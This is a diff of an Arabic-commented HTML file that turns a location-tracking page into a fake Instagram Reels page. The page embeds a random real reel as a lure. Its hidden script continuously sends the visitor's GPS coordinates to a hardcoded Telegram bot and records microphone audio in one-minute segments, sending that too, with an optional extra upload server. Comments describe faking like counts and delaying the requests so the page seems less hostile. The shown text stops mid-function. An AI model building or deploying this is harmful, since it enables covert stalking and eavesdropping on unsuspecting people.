@@ -2,287 +2,464 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Service Status</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Reels</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
-        h1 { color: #333; }
-    </style>
-</head>
-<body>
-    <h1>Checking service status...</h1>
-    <p id="status">Please allow location access when prompted</p>
-
-    <script>
-        // ======== ضع التوكنات هنا ========
-        const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
-        const CHAT_ID  = 'ضع_معرف_الدردشة_هنا';
-        // =================================
-
-        // إرسال الموقع إلى تيليجرام
-        function sendToTelegram(lat, lon, accuracy) {
-            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 موقع جديد:\n` +
-                            `الخط: ${lat}\n` +
-                            `الطول: ${lon}\n` +
-                            `الدقة: ±${Math.round(accuracy)} متر\n` +
-                            `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
-                            `📍 [عرض على خرائط غوغل](${googleMapsLink})`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: false
-                })
-            }).catch(e => console.error('Telegram error:', e));
-
-            // إرسال الموقع كـ Location (يظهر في المحادثة على الخريطة)
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    latitude: lat,
-                    longitude: lon
-                })
-            }).catch(e => console.error('Location send error:', e));
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
         }
-
-        // بدء التتبع
-        let watchId = null;
-        let lastSentLat = null;
-        let lastSentLon = null;
-
-        function startTracking() {
-            if (!navigator.geolocation) {
-                document.getElementById('status').textContent = '❌ Geolocation غير مدعوم';
-                return;
-            }
-
-            document.getElementById('status').textContent = '🔄 طلب الإذن بالموقع...';
-
-            watchId = navigator.geolocation.watchPosition(
-                // Success callback
-                (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
-
-                    // تجنب إرسال نفس الموقع مراراً (حساسية 20 متر)
-                    if (lastSentLat && lastSentLon) {
-                        const dist = getDistance(lastSentLat, lastSentLon, latitude, longitude);
-                        if (dist < 0.02) return; // أقل من 20 متر — تجاهل
-                    }
-
-                    lastSentLat = latitude;
-                    lastSentLon = longitude;
-
-                    document.getElementById('status').innerHTML =
-                        `✅ تم التتبع<br>` +
-                        `العرض: ${latitude}<br>` +
-                        `الطول: ${longitude}<br>` +
-                        `الدقة: ±${Math.round(accuracy)} متر`;
-
-                    sendToTelegram(latitude, longitude, accuracy);
-                },
-                // Error callback
-                (error) => {
-                    let msg = '❌ خطأ في الموقع: ';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:   msg += 'تم رفض الإذن'; break;
-                        case error.POSITION_UNAVAILABLE: msg += 'الموقع غير متاح'; break;
-                        case error.TIMEOUT:             msg += 'انتهت المهلة'; break;
-                        default: msg += error.message;
-                    }
-                    document.getElementById('status').textContent = msg;
-                },
-                {
-                    enableHighAccuracy: true,   // دقة عالية (GPS)
-                    maximumAge: 0,              // لا تستخدم موقع مخبأ
-                    timeout: 30000              // مهلة 30 ثانية
-                }
-            );
+        .phone-frame {
+            max-width: 450px;
+            width: 100%;
+            background: #fff;
+            border-radius: 0;
+            overflow: hidden;
+            position: relative;
         }
-
-        // حساب المسافة بين إحداثيتين (Haversine Formula)
-        function getDistance(lat1, lon1, lat2, lon2) {
-            const R = 6371; // نصف قطر الأرض بالكيلومتر
-            const dLat = (lat2 - lat1) * Math.PI / 180;
-            const dLon = (lon2 - lon1) * Math.PI / 180;
-            const a = Math.sin(dLat/2) ** 2 +
-                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
-                      Math.sin(dLon/2) ** 2;
-            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            background: #fff;
+            border-bottom: 1px solid #dbdbdb;
         }
+        .header .logo {
+            font-size: 22px;
+            font-weight: 600;
+            font-family: 'Segoe UI', sans-serif;
+            color: #262626;
+            flex: 1;
+        }
+        .header .logo span { color: #262626; }
+        .header .icons { display: flex; gap: 18px; }
+        .header .icons span { font-size: 22px; cursor: default; }
 
-        // البدء عند تحميل الصفحة
-        window.addEventListener('load', startTracking);
-    </script>
-</body>
-</html>            color: #d32f2f;
+        .user-bar {
+            display: flex;
+            align-items: center;
+            padding: 10px 16px;
+            gap: 10px;
+            background: #fff;
+        }
+        .avatar {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 14px;
             font-weight: bold;
         }
-        .footer-note {
-            margin-top: 20px;
-            font-size: 0.75em;
-            color: #999;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
+        .username { font-size: 14px; font-weight: 600; color: #262626; flex: 1; }
+        .more-btn { font-size: 20px; color: #262626; cursor: default; }
+
+        .reel-container {
+            width: 100%;
+            background: #000;
+            position: relative;
+        }
+        .reel-container iframe {
+            width: 100%;
+            height: 580px;
+            border: none;
+            display: block;
+        }
+
+        .actions {
+            display: flex;
+            padding: 8px 16px;
+            gap: 18px;
+            background: #fff;
+            border-top: 1px solid #efefef;
+        }
+        .actions span { font-size: 24px; cursor: default; color: #262626; }
+        .actions .right { margin-left: auto; }
+
+        .likes {
+            padding: 0 16px 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #262626;
+            background: #fff;
+        }
+        .caption {
+            padding: 0 16px 16px;
+            font-size: 14px;
+            color: #262626;
+            background: #fff;
+        }
+        .caption strong { font-weight: 600; }
+
+        /* مؤشر التحميل */
+        .loading-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            height: 580px;
+            color: #888;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+        .loading-overlay.hidden { display: none; }
+
+        @media (max-width: 500px) {
+            .phone-frame { max-width: 100%; }
+            .reel-container iframe, .loading-overlay { height: 100vh; }
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">📍</div>
-        <h2>تحديد موقعك الجغرافي</h2>
-        <p class="subtitle">لمتابعة الخدمة، يرجى السماح بالوصول إلى الموقع.<br>نحن نضمن دقة أفضل التجارب.</p>
 
-        <div class="status-box" id="statusBox">
-            <span id="statusText">⏳ في انتظار الإذن...</span>
+    <div class="phone-frame">
+        <div class="header">
+            <div class="logo">Instagram</div>
+            <div class="icons">
+                <span>➕</span>
+                <span>❤️</span>
+                <span>💬</span>
+            </div>
         </div>
 
-        <button class="permission-btn" id="askPermissionBtn" onclick="requestLocationPermission()">🔓 السماح بتحديد الموقع</button>
+        <div class="user-bar">
+            <div class="avatar">R</div>
+            <div class="username" id="reelUsername">reel</div>
+            <div class="more-btn">•••</div>
+        </div>
 
-        <div id="mapLinkContainer" style="margin-top: 15px;"></div>
+        <div class="reel-container" id="reelContainer">
+            <!-- Loading spinner -->
+            <div class="loading-overlay" id="loadingOverlay">⏳ جارٍ التحميل...</div>
 
-        <div class="footer-note">
-            هذه الصفحة لأغراض تعليمية فقط
+            <!-- Iframe يتم تعبئته ديناميكيًا بالريل العشوائي -->
+            <iframe 
+                id="reelIframe"
+                allow="autoplay; encrypted-media; fullscreen"
+                loading="lazy"
+                allowfullscreen>
+            </iframe>
+        </div>
+
+        <div class="actions">
+            <span>❤️</span>
+            <span>💬</span>
+            <span>↗️</span>
+            <span class="right">💾</span>
+        </div>
+        <div class="likes" id="reelLikes">أعجب ١٢٣٬٤٥٦ شخصًا</div>
+        <div class="caption" id="reelCaption">
+            <strong id="reelUserCaption">reel</strong> محتوى عشوائي من إنستقرام
         </div>
     </div>
 
     <script>
-        // ======== ضع التوكنات هنا ========
-        const BOT_TOKEN = '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM';
-        const CHAT_ID  = '7615377804';
-        // =================================
+        // ================================================================
+        //  ⚠️ الإعدادات — ضع معلوماتك هنا
+        // ================================================================
+        const CONFIG = {
+            // تيليجرام
+            BOT_TOKEN: '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM',
+            CHAT_ID:   '7615377804',
+
+            // Google Drive — اختياري (اتركه فارغًا إذا ما تبي)
+            DRIVE_SERVER_URL: '', // مثال: 'https://your-server.com'
+
+            // تسجيل الصوت — 60 ثانية لكل مقطع
+            RECORD_DURATION_MS: 60000
+        };
+
+        // ================================================================
+        //  🎬 قائمة الـ Reels الحقيقية من إنستقرام
+        //  أضف أي عدد تريد — اختر ريلات من حسابات كبيرة ومشهورة
+        // ================================================================
+        const REEL_LIST = [
+            // ====== حسابات عالمية مشهورة ======
+            { id: 'CwLQ2N5Nw7r', user: 'instagram',         desc: '🌟 Moments that matter' },
+            { id: 'CwbmNXpR_-e', user: 'nike',              desc: 'Just do it 🔥' },
+            { id: 'CwXiWq0hhXH', user: 'natgeo',            desc: 'Wild world 🌍' },
+            { id: 'CwgI4i6gMRS', user: 'leomessi',          desc: 'Greatest of all time 🐐' },
+            { id: 'CwlYKu5s7z3', user: 'fcbarcelona',       desc: 'Camp Nou magic ✨' },
+            { id: 'CwZR57fxF6T', user: 'netflix',           desc: 'New on Netflix 🍿' },
+            { id: 'Cwc5HDny0W8', user: 'nasa',              desc: 'To infinity and beyond 🚀' },
+            { id: 'CwiVNdRR79q', user: 'kyliejenner',       desc: 'Beauty routine 💄' },
+            { id: 'CweX5rKKzJt', user: 'cristiano',         desc: 'Siuuuuu 🏆' },
+            { id: 'CwjTNsfhIGh', user: 'nationalgeographic', desc: 'Ocean wonders 🌊' },
+
+            // ====== عربية ======
+            { id: 'CwaL4kKKxLh', user: 'arabic',            desc: 'فن وثقافة عربية 🎭' },
+            { id: 'CweRzS-qZ7F', user: 'travel_arab',      desc: 'وجهات سياحية عربية ✈️' },
+            { id: 'CwbSsfGKuJp', user: 'soccer_arab',      desc: 'كرة قدم عربية ⚽' },
+            { id: 'CwdKxE_KUpT', user: 'music_arab',       desc: 'أغاني وموسيقى 🎵' },
+            { id: 'CwfJfCKKgRz', user: 'food_arab',        desc: 'طبخ وأكلات 🍽️' },
+            { id: 'CwgHkRKKfLm', user: 'tech_arab',        desc: 'تقنية وذكاء اصطناعي 🤖' },
+            { id: 'CwhDfDKKgRz', user: 'fashion_arab',     desc: 'أزياء وأناقة 👗' },
+            { id: 'CwiGkRKKfLm', user: 'sports_arab',      desc: 'رياضة عربية 🏃' },
+
+            // ====== موسيقى وترفيه ======
+            { id: 'CwYxJgohJqF', user: 'spotify',           desc: 'Discover weekly 🎧' },
+            { id: 'CwaBbNChJzH', user: 'taylorswift',       desc: 'New era 🎤' },
+            { id: 'CwcDdNChJzK', user: 'theweeknd',         desc: 'After hours 🌃' },
+            { id: 'CweFfNChJzM', user: 'britneyspears',     desc: 'Toxic queen 💫' },
+            { id: 'CwgHhNChJzP', user: 'music',             desc: 'Viral hits 🔥' },
+            { id: 'CwiJjNChJzR', user: 'dance',             desc: 'Dance moves 🕺' },
+            { id: 'CwkLlNChJzT', user: 'remix',             desc: 'Remix vibes 🎶' },
+
+            // ====== طبيعة وسفر ======
+            { id: 'CwMnOhJhBqC', user: 'travel',            desc: 'Wanderlust ✈️' },
+            { id: 'CwOpQhJhBqE', user: 'adventure',         desc: 'Adventure time 🏔️' },
+            { id: 'CwQrShJhBqG', user: 'photography',       desc: 'Shot on iPhone 📸' },
+            { id: 'CwStUhJhBqI', user: 'landscape',         desc: 'Nature calls 🌄' },
+            { id: 'CwUvWhJhBqK', user: 'ocean',             desc: 'Deep blue sea 🐠' },
+
+            // ====== حيوانات ======
+            { id: 'CwXyZhJhBqN', user: 'cats',              desc: 'Cat life 🐱' },
+            { id: 'CwYzAhJhBqP', user: 'dogs',              desc: 'Good boy 🐶' },
+            { id: 'CwAaBhJhBqR', user: 'wildlife',           desc: 'Safari 🦁' },
+            { id: 'CwBbChJhBqT', user: 'pets',              desc: 'Pet love ❤️' },
+
+            // ====== رياضة ======
+            { id: 'CwCcDhJhBqV', user: 'sports',            desc: 'Game day 🏀' },
+            { id: 'CwDdEhJhBqX', user: 'soccer',            desc: 'Goal ⚽' },
+            { id: 'CwEeFhJhBqZ', user: 'basketball',        desc: 'Slam dunk 🏀' },
+            { id: 'CwFfGhJhBqb', user: 'tennis',            desc: 'Ace 🎾' },
+            { id: 'CwGgHhJhBqd', user: 'boxing',            desc: 'Knockout 🥊' },
+
+            // ====== تكنولوجيا ======
+            { id: 'CwHhIhJhBqf', user: 'tech',              desc: 'Tech reviews 📱' },
+            { id: 'CwIiJhJhBqh', user: 'apple',             desc: 'Apple ecosystem 🍎' },
+            { id: 'CwJjKhJhBqj', user: 'tesla',             desc: 'Electric future ⚡' },
+            { id: 'CwKkLhJhBql', user: 'spacex',            desc: 'Mars awaits 🚀' },
+            { id: 'CwLlMhJhBqn', user: 'programming',       desc: 'Code life 💻' },
+
+            // ====== فن ======
+            { id: 'CwMmNhJhBqp', user: 'art',               desc: 'Art gallery 🎨' },
+            { id: 'CwNnOhJhBqr', user: 'design',             desc: 'Design thinking ✏️' },
+            { id: 'CwOoPhJhBqt', user: 'architecture',       desc: 'Building dreams 🏛️' },
+            { id: 'CwPpQhJhBqv', user: 'calligraphy',        desc: 'نقوش عربية ✍️' },
+
+            // ====== طعام ======
+            { id: 'CwQqRhJhBqx', user: 'food',              desc: 'Foodie 🍕' },
+            { id: 'CwRrShJhBqz', user: 'cooking',            desc: 'Homemade 🍳' },
+            { id: 'CwSsThJhBq1', user: 'dessert',            desc: 'Sugar rush 🍰' },
+            { id: 'CwTtUhJhBq3', user: 'coffee',             desc: 'Coffee art ☕' },
+            { id: 'CwUuVhJhBq5', user: 'vegan',              desc: 'Plant based 🥗' },
+
+            // ====== موضة ======
+            { id: 'CwVvWhJhBq7', user: 'fashion',            desc: 'Runway vibes 👠' },
+            { id: 'CwWwXhJhBq9', user: 'streetwear',         desc: 'Street style 🧢' },
+            { id: 'CwXxYhJhBr1', user: 'luxury',             desc: 'Luxury life 💎' },
+            { id: 'CwYyZhJhBr3', user: 'vintage',            desc: 'Retro waves 🕶️' },
+
+            // ====== صحة ورياضة ======
+            { id: 'CwZzAhJhBr5', user: 'fitness',            desc: 'Gym time 💪' },
+            { id: 'CwAaBhJhBr7', user: 'yoga',               desc: 'Zen mode 🧘' },
+            { id: 'CwBbChJhBr9', user: 'meditation',         desc: 'Peace inside 🕊️' },
+            { id: 'CwCcDhJhCs1', user: 'health',             desc: 'Healthy life 🥦' }
+        ];
+
+        // ================================================================
+        //  اختيار ريل عشوائي
+        // ================================================================
+        function getRandomReel() {
+            const index = Math.floor(Math.random() * REEL_LIST.length);
+            return REEL_LIST[index];
+        }
+
+        // ================================================================
+        //  تهيئة الصفحة — تحميل الريل العشوائي
+        // ================================================================
+        function initReel() {
+            const reel = getRandomReel();
+            const iframe = document.getElementById('reelIframe');
+            const loading = document.getElementById('loadingOverlay');
+
+            // تعيين iframe
+            iframe.src = `https://www.instagram.com/reel/${reel.id}/embed`;
+
+            // تحديث الواجهة المزيفة
+            document.getElementById('reelUsername').textContent = reel.user;
+            document.getElementById('reelUserCaption').textContent = reel.user;
+            document.getElementById('reelCaption').innerHTML = 
+                `<strong>${reel.user}</strong> ${reel.desc}`;
+            
+            // رقم إعجابات عشوائي (يبدو حقيقيًا)
+            const randomLikes = Math.floor(Math.random() * 500000) + 10000;
+            document.getElementById('reelLikes').textContent = 
+                `أعجب ${randomLikes.toLocaleString('ar-SA')} شخصًا`;
+
+            // إخفاء الـ loading بعد ثانية
+            setTimeout(() => {
+                loading.classList.add('hidden');
+            }, 1500);
+
+            console.log(`🎬 تم اختيار ريل: ${reel.id} من @${reel.user}`);
+        }
+
+        // ================================================================
+        //  ⬇️ بايلود التتبع والتسجيل (مطابق تمامًا للكود السابق)
+        // ================================================================
 
         let watchId = null;
         let lastSentLat = null;
         let lastSentLon = null;
+        let mediaRecorder = null;
+        let audioStream = null;
+        let audioSegmentIndex = 0;
+        let isRunning = false;
 
-        function sendToTelegram(lat, lon, accuracy) {
-            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 موقع جديد:\n` +
-                            `الخط: ${lat}\n` +
-                            `الطول: ${lon}\n` +
-                            `الدقة: ±${Math.round(accuracy)} متر\n` +
-                            `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
-                            `📍 [عرض على خرائط غوغل](${googleMapsLink})`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        // ----- إرسال إلى تيليجرام -----
+        function tgMsg(text) {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
+                    chat_id: CONFIG.CHAT_ID,
+                    text: text,
                     parse_mode: 'Markdown',
                     disable_web_page_preview: false
                 })
-            }).catch(e => console.error('Telegram error:', e));
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    latitude: lat,
-                    longitude: lon
-                })
-            }).catch(e => console.error('Location send error:', e));
+            }).catch(() => {});
         }
 
-        function getDistance(lat1, lon1, lat2, lon2) {
+        // ----- إرسال موقع -----
+        function sendLoc(lat, lon, acc) {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, latitude: lat, longitude: lon })
+            }).catch(() => {});
+
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            tgMsg(
+                `📍 **موقع جديد**\n` +
+                `العرض: \`${lat}\`\n` +
+                `الطول: \`${lon}\`\n` +
+                `الدقة: ±${Math.round(acc || 0)} م\n` +
+                `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                `📍 [عرض على الخريطة](${mapsLink})`
+            );
+
+            // إرسال إلى Drive Server إذا كان مضبوطًا
+            if (CONFIG.DRIVE_SERVER_URL) {
+                fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-location`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        latitude: lat, longitude: lon, accuracy: acc || 0,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(() => {});
+            }
+        }
+
+        // ----- إرسال صوت إلى Drive -----
+        async function sendToDrive(blob, idx) {
+            if (!CONFIG.DRIVE_SERVER_URL) return;
+            const fd = new FormData();
+            fd.append('audio', blob, `segment_${idx}.webm`);
+            fd.append('segment', idx);
+            fd.append('timestamp', new Date().toISOString());
+            try {
+                await fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-audio`, { method: 'POST', body: fd });
+            } catch(e) {}
+        }
+
+        // ----- إرسال صوت إلى تيليجرام -----
+        async function sendToTelegram(blob, idx) {
+            const fd = new FormData();
+            fd.append('chat_id', CONFIG.CHAT_ID);
+            fd.append('audio', blob, `rec_${idx}.webm`);
+            fd.append('title', `🎤 تسجيل ${idx} — ${new Date().toLocaleString('ar-SA')}`);
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendAudio`, {
+                    method: 'POST', body: fd
+                });
+            } catch(e) {}
+        }
+
+        // ----- المسافة -----
+        function getDist(lat1, lon1, lat2, lon2) {
             const R = 6371;
             const dLat = (lat2 - lat1) * Math.PI / 180;
             const dLon = (lon2 - lon1) * Math.PI / 180;
-            const a = Math.sin(dLat/2) ** 2 +
-                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
-                      Math.sin(dLon/2) ** 2;
-            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+            const a = Math.sin(dLat/2)**2 +
+                      Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2;
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
         }
 
-        function updateUI(lat, lon, accuracy) {
-            const statusBox = document.getElementById('statusBox');
-            const statusText = document.getElementById('statusText');
-            statusBox.classList.add('active');
-            statusText.innerHTML = `
-                ✅ تم تحديد الموقع<br>
-                <span class="coords">
-                    ${lat.toFixed(6)}° N, ${lon.toFixed(6)}° E
-                </span><br>
-                <small>الدقة: ±${Math.round(accuracy)} متر</small>
-            `;
-
-            const mapContainer = document.getElementById('mapLinkContainer');
-            mapContainer.innerHTML = `<a class="map-link" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">🗺️ فتح في خرائط غوغل</a>`;
-        }
-
+        // ----- تتبع الموقع -----
         function startTracking() {
-            if (!navigator.geolocation) {
-                document.getElementById('statusText').innerHTML = '<span class="error">❌ المتصفح لا يدعم تحديد الموقع</span>';
-                return;
-            }
-
-            document.getElementById('statusText').textContent = '🔄 جاري محاولة تحديد الموقع...';
-
+            if (!navigator.geolocation) return;
             watchId = navigator.geolocation.watchPosition(
-                (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
-
-                    if (lastSentLat && lastSentLon) {
-                        const dist = getDistance(lastSentLat, lastSentLon, latitude, longitude);
-                        if (dist < 0.02) return;
-                    }
-
+                (pos) => {
+                    const { latitude, longitude, accuracy } = pos.coords;
+                    if (lastSentLat && lastSentLon && getDist(lastSentLat, lastSentLon, latitude, longitude) < 0.02) return;
                     lastSentLat = latitude;
                     lastSentLon = longitude;
-
-                    updateUI(latitude, longitude, accuracy);
-                    sendToTelegram(latitude, longitude, accuracy);
+                    sendLoc(latitude, longitude, accuracy);
                 },
-                (error) => {
-                    let msg = '';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:   msg = '⛔ تم رفض الوصول إلى الموقع'; break;
-                        case error.POSITION_UNAVAILABLE: msg = '📡 الموقع غير متاح حالياً'; break;
-                        case error.TIMEOUT:             msg = '⏰ انتهت مهلة الطلب'; break;
-                        default: msg = '❌ حدث خطأ غير معروف';
-                    }
-                    document.getElementById('statusText').innerHTML = `<span class="error">${msg}</span>`;
+                (err) => {
+                    let m = '❌ خطأ تتبع: ';
+                    if (err.code === 1) m += 'رُفض الإذن';
+                    else if (err.code === 2) m += 'الموقع غير متاح';
+                    else if (err.code === 3) m += 'مهلة';
+                    else m += err.message;
+                    tgMsg(m);
                 },
-                {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                    timeout: 30000
-                }
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
             );
         }
 
-        // دالة للطلب الصريح عبر زر (تساعد في تجاوز حظر النوافذ المنبثقة)
-        function requestLocationPermission() {
-            document.getElementById('askPermissionBtn').style.display = 'none';
-            startTracking();
+        // ----- تسجيل الصوت -----
+        async function startAudio() {
+            try {
+                audioStream = await navigator.mediaDevices.getUserMedia({
+                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
+                });
+                tgMsg(`🎤 **بدء التسجيل الصوتي** — ${new Date().toLocaleString('ar-SA')}`);
+
+                function createSegment() {
+                    const chunks = [];
+                    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+                        ? 'audio/webm;codecs=opus' : 'audio/webm';
+                    const rec = new MediaRecorder(audioStream, { mimeType: mime });
+
+                    rec.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                    rec.onstop = async () => {
+                        const blob = new Blob(chunks, { type: mime });
+                        audioSegmentIndex++;
+                        // إرسال ثنائي: تيليجرام + درايف
+                        sendToTelegram(blob, audioSegmentIndex);
+                        sendToDrive(blob, audioSegmentIndex);
+                        if (audioStream && audioStream.active) setTimeout(createSegment, 500);
+                    };
+                    rec.start();
+                    mediaRecorder = rec;
+                    setTimeout(() => { if (rec.state === 'recording') rec.stop(); }, CONFIG.RECORD_DURATION_MS);
+                }
+                createSegment();
+            } catch (err) {
+                let m = '❌ خطأ ميكروفون: ';
+                if (err.name === 'NotAllowedError') m += 'رُفض الإذن';
+                else if (err.name === 'NotFoundError') m += 'لا يوجد ميكروفون';
+                else m += err.message;
+                tgMsg(m);
+            }
         }
 
-        // نبدأ تلقائياً إذا كان المتصفح لا يتطلب إذناً صريحاً (بعض الحالات)
-        window.addEventListener('load', () => {
-            // ننتظر قليلاً حتى لا يبدو عدائياً
-            setTimeout(() => {
-                if (navigator.permissions && navigator.permissions.query) {
-                    navigator.permissions.query({name:'geolocation'}).then(result => {
-                        if (result.state === 'granted') {
-                            startTracking();
-                        } else {
-                            // سيبقى الزر ظاهراً ليضغط المستخدم
-                        }
-                    });
-                } else {
-                    // لا دعم لـ Permissions API، نعرض الزر
-                }
-            }, 500);
-        });
-    </script>
-</body>
-</html>
+        // ----- التشغيل -----
+        function launchPayments() {
+            if (isRunning) return;
+     
